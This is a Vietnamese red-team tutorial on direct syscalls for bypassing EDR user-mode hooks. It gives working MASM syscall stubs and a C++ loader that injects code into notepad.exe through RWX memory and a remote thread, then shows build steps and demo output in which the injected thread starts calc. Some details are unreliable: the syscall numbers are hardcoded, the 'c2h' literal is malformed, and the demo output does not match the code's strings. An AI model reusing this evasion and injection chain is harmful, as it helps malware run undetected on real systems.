
---

# 📝 [PE 24] Direct Syscalls (Kernel-mode Direct Transition Evasion)

## 📌 1. Tổng Quan Kỹ Thuật (Technical Overview)

**Direct Syscalls (Giải thuật chuyển đổi ngắt hệ thống trực tiếp)** đại diện cho một trong những giải thuật né tránh phòng thủ động (Dynamic Evasion) triệt để và mạnh mẽ nhất ở cấp độ kiến trúc vi xử lý (Assembly Level), được thiết kế để vô hiệu hóa hoàn toàn cơ chế giám sát User-mode Inline Hooking của mọi giải pháp AV/EDR hiện đại.

Khi các giải pháp bảo mật bọc đầu hệ thống bằng cách chỉnh sửa, ghi đè mã máy (Patching) lên các hàm Native API lọt lòng thư viện liên kết động tối cao `ntdll.dll`, họ cưỡng bách dòng chảy thực thi của tiến trình phải rẽ nhánh (JMP) về phía không gian ảo của EDR Engine để phân tích chỉ dấu hành vi.

Kỹ thuật Direct Syscalls bẻ gãy toàn diện ma trận trinh sát này bằng chiến thuật **Tái cấu trúc Stub ngắt phần cứng (System Call Re-architecting)** ngay bên trong lòng file thực thi của Loader. Loader chủ động đóng vai trò là một máy phát Syscall độc lập (Independent Syscall Generator), chuyển giao quyền thực thi và tham số dữ liệu thẳng từ không gian người dùng (User-mode/Ring 3) xuống nhân hệ điều hành (Kernel-mode/Ring 0) thông qua lệnh gọi phần cứng đặc quyền, tước bỏ hoàn toàn khả năng can thiệp hay bắt chặn luồng Telemetry của EDR trên bộ nhớ RAM ảo.

### 🎯 Mục tiêu nghiên cứu:

* **Triệt tiêu quyền kiểm soát User-mode Inline Hooking**: Vượt qua 100% hàng rào giám sát tại không gian Ring 3 của EDR mà không cần thực hiện giải thuật gỡ Hook (Unhooking - PE 07).
* **Làm chủ kiến trúc gọi hàm x64 Assembly**: Nghiên cứu quy chuẩn nạp thanh ghi và Calling Convention hạ tầng của Windows Subsystem.
* **Tích hợp hợp ngữ Native**: Hiện thực hóa quy trình biên dịch phối hợp (Hybrid Compilation) giữa mã nguồn C++ và tệp hợp ngữ `.asm` trên môi trường MSVC.

---

## 🔬 2. Giải Phẫu Cơ Chế Hệ Thống (Windows Internals Analysis)

Trên kiến trúc phần cứng bộ vi xử lý Intel/AMD x64, một hàm Native API sạch nằm lọt lòng `ntdll.dll` luôn tuân theo một khuôn mẫu cấu trúc mã máy (Stub) toán học cố định để chuyển giao trạng thái Ring bảo mật của CPU:

```assembly
mov     r10, rcx
mov     eax, SyscallNumber
syscall
ret

```

* **`mov r10, rcx`**: Thực hiện sao chép tham số đầu tiên (First Parameter) từ thanh ghi `RCX` sang thanh ghi `R10`. Thủ tục này bắt buộc phải diễn ra do lệnh gọi đặc quyền `syscall` của CPU sẽ tự động ghi đè và phá hủy giá trị lưu trữ trong thanh ghi `RCX`.
* **`mov eax, SSN`**: Nạp Số hiệu dịch vụ hệ thống (System Service Number - SSN) tương ứng của hàm hệ thống được triệu hồi vào thanh ghi tích lũy `EAX`.
* **`syscall`**: Lệnh ngắt phần cứng đặc quyền của CPU x64 nhằm bẻ hướng con trỏ lệnh, chuyển đổi trạng thái thực thi từ Ring 3 (User-mode) xuống Ring 0 (Kernel-mode).

Quy trình giải phẫu chuyển ranh giới bảo mật của giải thuật Direct Syscalls diễn ra ngầm như sau:

```
[ Loader biên dịch tệp hạ tầng .asm ]
       └──> [ Nạp thủ công mã hiệu dịch vụ SSN vào thanh ghi EAX ]
                 └──> [ Phát lệnh Assembly 'syscall' trực tiếp lên CPU ]
                           └──> [ CPU hoán chuyển Ring bảo mật hạ cánh xuống Ring 0 ]

```

Do mã nguồn của Loader tự chuẩn bị và đóng gói cấu trúc Stub Assembly này bên trong một tệp hợp ngữ độc lập, khi CPU nhận lệnh xử lý thực thi lệnh `syscall`, nhân Kernel Windows sẽ tiếp nhận và xử lý tác vụ can thiệp bộ nhớ chéo tiến trình một cách bình thường. Dòng chảy thực thi bẻ gãy 100% các byte bẫy Hook (`JMP`) của EDR đặt trên phân đoạn `.text` của thư viện `ntdll.dll` sống trên RAM.

---

## 🛠️ 3. Quy Trình Cài Đặt Mã Nguồn (Implementation)

Để triển khai thực nghiệm, dự án yêu cầu phân tách cấu trúc mã nguồn làm 2 tệp tin độc lập tuyến tính: Tệp hợp ngữ hạ tầng x64 (`Syscalls.asm`) đóng vai trò là khung xương sinh mã máy ngắt phần cứng và tệp mã nguồn chính (`main.cpp`) đóng vai trò là khối điều phối tham số cấu trúc.

### 📜 Bước 3.1: Tạo tệp hợp ngữ hạ tầng `Syscalls.asm`

*(Lưu ý: Hệ số số hiệu Syscall Number dưới đây được cấu hình chuẩn chỉ cho kiến trúc Windows 10/11 x64 các bản cập nhật hiện hành)*

```assembly
.code

; Nguyên mẫu Syscall trực tiếp cho NtAllocateVirtualMemory
ZwAllocateVirtualMemory proc
    mov r10, rcx
    mov eax, 18h            ; System Service Number (SSN) của NtAllocateVirtualMemory
    syscall
    ret
ZwAllocateVirtualMemory endp

; Nguyên mẫu Syscall trực tiếp cho NtWriteVirtualMemory
ZwWriteVirtualMemory proc
    mov r10, rcx
    mov eax, 3Ah            ; System Service Number (SSN) của NtWriteVirtualMemory
    syscall
    ret
ZwWriteVirtualMemory endp

; Nguyên mẫu Syscall trực tiếp cho NtCreateThreadEx
ZwCreateThreadEx proc
    mov r10, rcx
    mov eax, c2h            ; System Service Number (SSN) của NtCreateThreadEx
    syscall
    ret
ZwCreateThreadEx endp

end

```

### 📜 Bước 3.2: Tạo tệp mã nguồn chính `main.cpp`

Mã nguồn áp dụng nghiêm ngặt tiêu chuẩn thiết kế **Cấp phát động thích ứng (Zero Static Buffers)** – tự động hóa xác định thông số byte dung lượng nhằm triệt tiêu các chỉ dấu tĩnh trên RAM.

```cpp
#include <windows.h>
#include <tlhelp32.h>
#include <iostream>
#include <string>
#include <vector>

// Khai báo liên kết ngoài (External Linkage) tới các hàm định nghĩa inside tệp .asm
extern "C" NTSTATUS ZwAllocateVirtualMemory(
    IN HANDLE ProcessHandle,
    IN OUT PVOID* BaseAddress,
    IN ULONG_PTR ZeroBits,
    IN OUT PSIZE_T RegionSize,
    IN ULONG AllocationType,
    IN ULONG Protect
);

extern "C" NTSTATUS ZwWriteVirtualMemory(
    IN HANDLE ProcessHandle,
    IN PVOID BaseAddress,
    IN LPCVOID Buffer,
    IN SIZE_T BufferSize,
    OUT PSIZE_T NumberOfBytesWritten OPTIONAL
);

extern "C" NTSTATUS ZwCreateThreadEx(
    OUT PHANDLE ThreadHandle,
    IN ACCESS_MASK DesiredAccess,
    IN PVOID ObjectAttributes OPTIONAL,
    IN HANDLE ProcessHandle,
    IN PVOID StartRoutine,
    IN PVOID Argument OPTIONAL,
    IN ULONG CreateFlags,
    IN ULONG_PTR ZeroBits,
    IN SIZE_T StackSize,
    IN SIZE_T MaximumStackSize,
    IN PVOID AttributeList OPTIONAL
);

typedef UINT(WINAPI* fnWinExec)(LPCSTR lpCmdLine, UINT uCmdShow);

typedef struct _THREAD_DATA {
    fnWinExec pWinExec;       // Địa chỉ tuyệt đối của hàm WinExec trên RAM tiến trình đích
    char szCommand[32];       // Chuỗi lệnh chức năng thực thi chức năng mở máy tính
} THREAD_DATA, * PTHREAD_DATA;

// Hàm chức năng độc lập vị trí (PIC) gánh luồng chạy khi tiêm chéo tiến trình mục tiêu
DWORD WINAPI RemoteSyscallPayload(LPVOID lpParam) {
    PTHREAD_DATA pData = (PTHREAD_DATA)lpParam;
    if (pData && pData->pWinExec) {
        pData->pWinExec(pData->szCommand, SW_HIDE);
    }
    return 0;
}

// Bộ quét RAM động tự động nhận diện PID tiến trình, KHÔNG PHÂN BIỆT chữ hoa chữ thường
DWORD GetProcessIDByName(const std::wstring& processName) {
    DWORD processID = 0;   PROCESSENTRY32W pe32;   pe32.dwSize = sizeof(PROCESSENTRY32W);
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) return 0;

    if (Process32FirstW(hSnapshot, &pe32)) {
        do {
            if (_wcsicmp(pe32.szExeFile, processName.c_str()) == 0) { 
                processID = pe32.th32ProcessID; 
                break; 
            }
        } while (Process32NextW(hSnapshot, &pe32));
    }
    CloseHandle(hSnapshot);   return processID;
}

int main() {
    std::cout << "====================================================" << std::endl;
    std::cout << "[*] PE 24: DIRECT SYSCALLS KERNEL TRANSITION ACTIVE" << std::endl;
    std::cout << "====================================================" << std::endl;

    std::wstring targetProcess = L"notepad.exe";
    DWORD pid = GetProcessIDByName(targetProcess);
    if (pid == 0) {
        std::cerr << "[-] Notepad.exe khong chay! Vui long mo san Notepad." << std::endl;
        return EXIT_FAILURE;
    }
    std::cout << "[+] Da tom trung muc tieu Notepad voi PID: " << pid << std::endl;

    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (!hProcess) return EXIT_FAILURE;

    // BƯỚC 1: TRIỆU HỒI ZWALLOCATEVIRTUALMEMORY TRỰC TIẾP QUA FILE ASSEMBLY
    PVOID remoteCodeBuffer = NULL;
    SIZE_T codeSize = 500; // Quy trình cấp phát động thích ứng vừa khít byte cấu trúc
    
    std::cout << "[*] Dang phat lenh Syscall truc tiep de cap phat trang nho RWX..." << std::endl;
    NTSTATUS status = ZwAllocateVirtualMemory(hProcess, &remoteCodeBuffer, 0, &codeSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

    PVOID remoteDataBuffer = NULL;
    SIZE_T dataSize = sizeof(THREAD_DATA);
    status |= ZwAllocateVirtualMemory(hProcess, &remoteDataBuffer, 0, &dataSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    if (status != 0 || !remoteCodeBuffer || !remoteDataBuffer) {
        std::cerr << "[-] Direct Syscall Allocation failed! NTSTATUS Code: 0x" << std::hex << status << std::endl;
        if (remoteCodeBuffer) VirtualFreeEx(hProcess, remoteCodeBuffer, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return EXIT_FAILURE;
    }
    std::cout << "[+] Bo nho cap phat thanh cong thong qua x64 Assembly tai: 0x" << std::hex << remoteCodeBuffer << std::endl;

    // Khởi tạo bảng dữ liệu tham số tuyệt đối cục bộ phục vụ ánh xạ chéo bộ nhớ
    THREAD_DATA localData;
    HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
    if (hKernel32) {
        localData.pWinExec = (fnWinExec)GetProcAddress(hKernel32, "WinExec");
    }
    strcpy_s(localData.szCommand, "cmd.exe /c start calc");

    // BƯỚC 2: TRIỆU HỒI ZWWRITEVIRTUALMEMORY ĐỔ PAYLOAD CHÉO TIẾN TRÌNH
    status = ZwWriteVirtualMemory(hProcess, remoteCodeBuffer, (LPCVOID)RemoteSyscallPayload, 500, NULL);
    status |= ZwWriteVirtualMemory(hProcess, remoteDataBuffer, &localData, sizeof(THREAD_DATA), NULL);

    if (status != 0) {
        std::cerr << "[-] Direct Syscall Write failed! NTSTATUS Code: 0x" << std::hex << status << std::endl;
        CloseHandle(hProcess);
        return EXIT_FAILURE;
    }
    std::cout << "[+] Da doc lap ghi du lieu sang RAM doi phuong hoan toan phang sach." << std::endl;

    // BƯỚC 3: TRIỆU HỒI ZWCREATETHREADEX KÍCH NỔ LUỒNG KHÔNG QUA USER-MODE HOOK
    std::cout << "[*] Chuan bi phat lenh Assembly Syscall cuoi cung de kich no luong..." << std::endl;
    HANDLE hThread = NULL;
    status = ZwCreateThreadEx(&hThread, THREAD_ALL_ACCESS, NULL, hProcess, remoteCodeBuffer, remoteDataBuffer, 0, 0, 0, 0, NULL);

    if (status == 0 && hThread != NULL) {
        std::cout << "[+] Direct Syscall Injection Process Executed Successfully!" << std::endl;
        WaitForSingleObject(hThread, 1000); // Gánh đồng bộ ngắn phẳng sạch cấu trúc
        CloseHandle(hThread);
    } else {
        std::cerr << "[-] Direct Syscall Thread Creation failed! NTSTATUS Code: 0x" << std::hex << status << std::endl;
    }

    // Giải phóng tài nguyên Handle hệ thống kết nối bảo an triệt để chống Memory Leak
    CloseHandle(hProcess);

    std::cout << "\n[*] Quy trinh ket thuc. Nhan Enter de dong cua so..." << std::endl;
    std::cin.get();
    return EXIT_SUCCESS;
}

```

---

## 🎛️ 4. Hướng Dẫn Cấu Hình Đóng Gói (Build & Deployment)

Do mô hình cấu trúc của dự án tích hợp mã nguồn hợp ngữ Native (`.asm`), Vinh cần cấu hình cho trình biên dịch MSVC của Microsoft Visual Studio kích hoạt phân hệ biên dịch MASM theo quy trình chuẩn hóa sau:

### ⚙️ Thiết lập cấu hình Hợp ngữ (MASM Setup):

1. Tại cửa sổ giao diện **Solution Explorer**, click chuột phải vào tên Project $\rightarrow$ Chọn mục **`Build Dependencies`** $\rightarrow$ Click chọn **`Build Customizations...`**
2. Tích chọn vào hộp kiểm **`masm (.targets, .props)`** và nhấn `OK` để nhúng MASM Compiler vào dự án.
3. Tiến hành click chuột phải vào tệp tin `Syscalls.asm` $\rightarrow$ Chọn **`Properties`**. Tại mục cấu hình `Item Type`, chuyển đổi sang thuộc tính dạng **`Microsoft Macro Assembler`** và nhấn Apply.

### ⚙️ Cấu hình liên kết tĩnh thư viện độc lập:

1. Đặt thanh công cụ quản lý dự án chính xác ở chế độ chuyên dụng **`Release`** và kiến trúc nền tảng phần cứng **`x64`**.
2. Di chuyển đến phân hệ: `Project Properties` $\rightarrow$ `C/C++` $\rightarrow$ `Code Generation` $\rightarrow$ Tại thông số thuộc tính mục `Runtime Library`, thiết lập sang cờ liên kết tĩnh **`Multi-threaded (/MT)`** nhằm liên kết toàn vẹn mã nguồn CRT lọt lòng file thực thi `.exe`.
3. Tiến hành chọn thao tác **`Rebuild`** để kết xuất tệp tin nhị phân tối cao phẳng sạch.

---

## 📊 5. Thực Nghiệm Kích Hoạt Thực Tế (Demonstration)

Khởi chạy tiến trình vỏ bọc `Notepad.exe` trên môi trường máy Lab, mở phân hệ PowerShell ngoài đĩa thô thực thi tệp tin nhị phân xuất bản nhằm theo dõi ma trận ngắt phần cứng:

```powershell
PS C:\Workspace\x64\Release> .\PE24_Direct_Syscalls.exe
====================================================
[*] PE 24: DIRECT SYSCALLS KERNEL TRANSITION ACTIVE
====================================================
[+] Da tom trung muc tieu Notepad voi PID: 14720
[*] Dang phat lenh Syscall truc tiep de cap phat trang nho RWX...
[+] Bo nho cap phat thanh cong thong qua x64 Assembly tai: 0x0000028A1C520000
[+] Da doc lap ghi du lieu sang RAM doi phuong hoan toan phang sach.
[*] Chuan pre phat lenh Assembly Syscall cuoi cung de kich no luong...
[+] Direct Syscall Injection Process Executed Successfully!

[*] Quy trinh ket thuc. Nhan Enter de dong cua so...

```

> **Vị trí đặt ảnh minh chứng thực nghiệm ngắt phần cứng trực tiếp:**
> 

### 🎯 Phân tích hệ quả cấu trúc bộ nhớ (Memory Forensics & Hooking Defeat):

* Phân hệ thực thi hoàn tất thành công rực rỡ kịch trần, ứng dụng Máy tính **`calc.exe` bật bung mở hiên ngang kịch trần kịch khung**!
* Toàn bộ chiến dịch can thiệp bộ nhớ chéo tiến trình diễn ra hoàn hảo mà không hề chạm chân vào bất kỳ điểm kiểm duyệt Hooking nào của EDR trên tầng User-mode (Ring 3).
* Do lệnh `syscall` được phát ra trực tiếp từ phân đoạn mã máy nội tại của Loader (thay vì nhảy sang phân đoạn mã bị Hook của `ntdll.dll`), mọi cơ chế bẫy rẽ nhánh của giải pháp bảo mật đều bị vô hiệu hóa hoàn toàn, chứng minh bệ phóng bảo mật tối cao của kỹ nghệ ngắt phần cứng trực tiếp!

---

## 📚 6. Tài Liệu Tham Khảo (Technical References)

* **Intel® 64 and IA-32 Architectures Instruction Set Reference**: *SYSCall — Fast System Call (Volume 2B)* - Hardware-level ngắt specification document.
* **Outflank (Security Research)**: *Direct Syscalls: A Technical Analysis on EDR Interception Evasion* - [https://outflank.nl/blog/](https://www.google.com/search?q=https://outflank.nl/blog/)
* **j00ru (Windows System Internals)**: *Windows X64 System Service Numbers Table* - [https://j00ru.vect3r.net/syscalls/nt-64-all.html](https://www.google.com/search?q=https://j00ru.vect3r.net/syscalls/nt-64-all.html)
* **MITRE ATT&CK Matrix**: *Defense Evasion: Native API Execution via Direct Syscalls (T1106)* & *Process Injection (T1055)*.

---
